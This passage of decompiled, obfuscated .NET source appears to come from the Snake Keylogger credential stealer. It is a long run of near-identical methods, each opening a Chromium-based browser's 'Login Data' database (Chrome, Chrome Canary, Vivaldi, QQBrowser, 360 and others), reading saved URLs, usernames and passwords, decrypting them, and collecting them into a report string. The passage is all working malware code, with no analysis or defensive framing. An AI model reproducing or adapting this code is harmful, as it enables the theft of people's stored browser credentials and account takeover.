				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _002Dݝ_0089_0609_1CFC()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome SxS\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Chrome Canary\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _FFFD_07FB_FFFD_0739_0327()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Google Chrome\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ò_07FBɮҢ_0314()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Coowon\\Coowon\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Coowon\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0739똛_FFFD븤_06DA()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\CocCoc\\Browser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: CocCoc\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0300츠Ю_F0B9O()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\uCozMedia\\Uran\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Uran\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ٵמհ_FFFD_FFFD()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Tencent\\QQBrowser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: QQ\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _FFFDױ_FFFDΑҚ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Orbitum\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Orbitum\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _FFFD츠ŧ_FFFDԌ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Slimjet\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Slimjet\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _FFFDΩŲŔ_0314()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Iridium\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Iridium\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0300Ł_FFFD_0609չ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Vivaldi\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Vivaldi\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ҏ_05B4اհϫ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chromium\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Iron\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Π皍_FFFDĂܪ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chromium\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Chromium\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ޤ_0097_FFFD߂і()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GhostBrowser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Ghost\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ɵ_FFFD_FFFDל_07A8()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\CentBrowser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Cent\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void œߟ퓜丐_FFFD()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Xvast\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: xVast\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ߟמ߂늻丐()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Chedot\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Chedot\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ѕ_FFFD_00BEՄɇ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\SuperBird\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Superbird\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0300ϫƉœ쐬()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\360Browser\\Browser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: 360\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void ݝK_02E8Ԍ_05C3()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\360Chrome\\Chrome\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
